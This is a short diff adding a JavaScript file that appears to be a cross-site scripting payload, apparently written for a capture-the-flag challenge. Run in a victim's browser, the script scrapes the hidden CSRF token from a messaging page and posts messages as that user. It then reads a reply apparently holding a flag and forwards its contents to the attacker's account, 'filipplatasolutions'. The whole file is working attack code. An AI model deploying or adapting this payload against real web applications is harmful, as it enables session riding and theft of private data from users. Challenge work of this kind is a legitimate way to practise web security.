@@ -1,0 +1,60 @@
+function get_csrf(html_page) {
+	var parser = new DOMParser();	
+	var doc = parser.parseFromString(html_page, "text/html");
+
+	var csrf;
+	var inputs = doc.getElementsByTagName('input');
+
+	for(var i = 0; i < inputs.length; i++) {
+    		if(inputs[i].type.toLowerCase() == 'hidden') {
+        	  csrf = inputs[i].value;
+    		}
+	}
+	return csrf;
+};
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '/send_message');
+xhr.onload = function() {
+	var formData = new FormData();
+	var parser = new DOMParser();	
+	var doc;
+
+	var csrf = get_csrf(xhr.responseText);
+
+        formData.append("username", "admin");
+        formData.append("content", "dej flage");
+	formData.append("csrfmiddlewaretoken", csrf);
+
+	 var xhr1 = new XMLHttpRequest();
+	 xhr1.open('POST', '/send_message');
+	 xhr1.onload = function() {
+	   // admin flag reponse
+	   doc = parser.parseFromString(xhr1.responseText, "text/html");
+	   var flag_response = "/reply/" + doc.getElementsByTagName("a")[5].innerHTML;
+
+	   var xhr_flag = new XMLHttpRequest();
+	   xhr_flag.open('GET', flag_response);
+	   xhr_flag.onload = function() {
+	   	var formFlag = new FormData();
+
+		//var xhr_csrf = new XMLHttpRequest();
+    	        //xhr_csrf.open('GET', '/send_message');
+		//xhr_csrf.onload = function() {
+		//       csrf = get_csrf(xhr_csrf.responseText);
+		       formFlag.append("username", "filipplatasolutions");
+        	       formFlag.append("content", xhr_flag.responseText,);
+		       formFlag.append("csrfmiddlewaretoken", csrf);
+		       var xhr_hacked = new XMLHttpRequest();
+		       xhr_hacked.open('POST', '/send_message');
+		       xhr_hacked.send(formFlag);
+		//};
+		//xhr_csrf.send();
+	   };
+	   setTimeout(function(){
+	      xhr_flag.send();
+    	   }, 2800);  
+	 };
+	 xhr1.send(formData);
+};
+xhr.send();
